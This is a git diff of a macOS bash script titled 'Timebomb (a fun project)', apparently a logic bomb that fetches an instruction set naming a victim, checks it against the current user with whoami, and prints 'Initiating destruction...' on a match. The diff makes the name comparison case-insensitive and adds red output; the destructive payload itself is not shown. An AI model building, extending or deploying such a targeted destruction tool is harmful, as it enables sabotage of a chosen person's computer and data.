@@ -52,8 +52,12 @@ function verifyInsSet(){
 
 function parseInsSet(){
 	# Parse name
-	vicName=$($plBud -c "Print Instructions:Victim\ Name" $insFile)
+	vicName=$($plBud -c "Print Instructions:Victim\ Name" $insFile | perl -ne 'print lc')
 	echo "Parsed Name as: $vicName"
+}
+
+function echo_red(){
+	echo -e "\033[31m$1\033[0m"
 }
 
 # Welcome, friend? enemy? whatever!
@@ -61,10 +65,10 @@ echo "###### Timebomb (a fun project) by Nick aka black.dragon74 ######"
 
 # Demo mode handler, if demo mode is set to yes, a different set of declarations are done
 if [[ $demoMode == "yes" ]]; then
-	echo "Running in demo mode..."
+	echo_red "Running in demo mode..."
 	# Override remote file to that of local file when running under demo mode
 	insFile=$userHome/Desktop/victim.plist
-	echo "Using local instruction set at: $insFile"
+	echo_red "Using local instruction set at: $insFile"
 else
 	# Reserved in  case you wish to do any further configurations
 	:
@@ -90,8 +94,8 @@ verifyInsSet
 parseInsSet
 
 # Start attack only if the victim name in instrcution set matches to that of victim
-if [[ $vicName == "$(whoami)" ]]; then
-	echo "Program running on victim's computer. Initiating destruction..."
+if [[ $vicName == "$(whoami | perl -ne 'print lc')" ]]; then
+	echo_red "Program running on victim's computer. Initiating destruction..."
 else
 	echo "Victim is $vicName but program is running on "$(whoami)"'s computer."
 	echo "Disarming daemons and the bomb."
